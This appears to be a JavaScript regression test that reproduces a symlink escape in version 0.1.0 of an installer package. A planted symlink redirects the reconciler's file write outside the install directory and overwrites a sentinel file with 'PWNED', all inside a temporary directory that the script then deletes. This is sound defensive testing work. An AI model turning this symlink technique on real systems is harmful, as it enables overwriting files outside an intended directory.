/**
 * RED repro: symlink escape via intermediate component.
 *
 * Against @henryavila/minimalist-installer@0.1.0 the reconciler only checks
 * lexical containment (resolve/join), then writeFileSync-follows symlinks. A
 * pre-placed symlink component redirects the write outside basePath, clobbering
 * an external sentinel.
 *
 * Exit 0 = vulnerability observed (expected RED signature).
 * Exit 1 = safe behavior (write refused / sentinel intact) — not yet expected on 0.1.0.
 */
import {
  mkdtempSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, rmSync, existsSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { createRequire } from 'node:module';
import { pathToFileURL, fileURLToPath } from 'node:url';

// Always use the vendored 0.1.0 package for RED signatures (not the remediated pin).
const FIXTURE_PKG = join(dirname(fileURLToPath(import.meta.url)), 'package');

function resolvePackageRoot() {
  return FIXTURE_PKG;
}

const SIGNATURE = 'PATH_CONFINEMENT_SYMLINK_ESCAPE';

export async function run(options = {}) {
  const pkgRoot = options.packageRoot ?? resolvePackageRoot();
  const { createReconcileFileSetEffect } = await import(
    pathToFileURL(join(pkgRoot, 'src/kernel/reconciler.js')).href
  );

  const root = mkdtempSync(join(tmpdir(), 'mi-repro-path-confine-'));
  try {
    const basePath = join(root, 'install');
    const outside = join(root, 'outside');
    mkdirSync(basePath, { recursive: true });
    mkdirSync(outside, { recursive: true });
    const sentinelPath = join(outside, 'secret.txt');
    const sentinel = 'SENTINEL-UNTOUCHED';
    writeFileSync(sentinelPath, sentinel, 'utf8');

    // Intermediate component is a symlink to outside the install root.
    symlinkSync(outside, join(basePath, 'nested'));

    const effect = createReconcileFileSetEffect();
    let threw = null;
    try {
      effect.apply({
        basePath,
        desired: [{ path: 'nested/secret.txt', content: 'PWNED' }],
      });
    } catch (err) {
      threw = err;
    }

    const after = existsSync(sentinelPath) ? readFileSync(sentinelPath, 'utf8') : null;
    const escaped = after === 'PWNED';
    return {
      signature: SIGNATURE,
      vulnerable: escaped && threw === null,
      threw: threw ? String(threw.message || threw) : null,
      sentinelAfter: after,
      expectedVulnerableOn010: true,
    };
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

if (import.meta.url === pathToFileURL(process.argv[1]).href) {
  const result = await run();
  console.log(JSON.stringify(result, null, 2));
  process.exit(result.vulnerable ? 0 : 1);
}
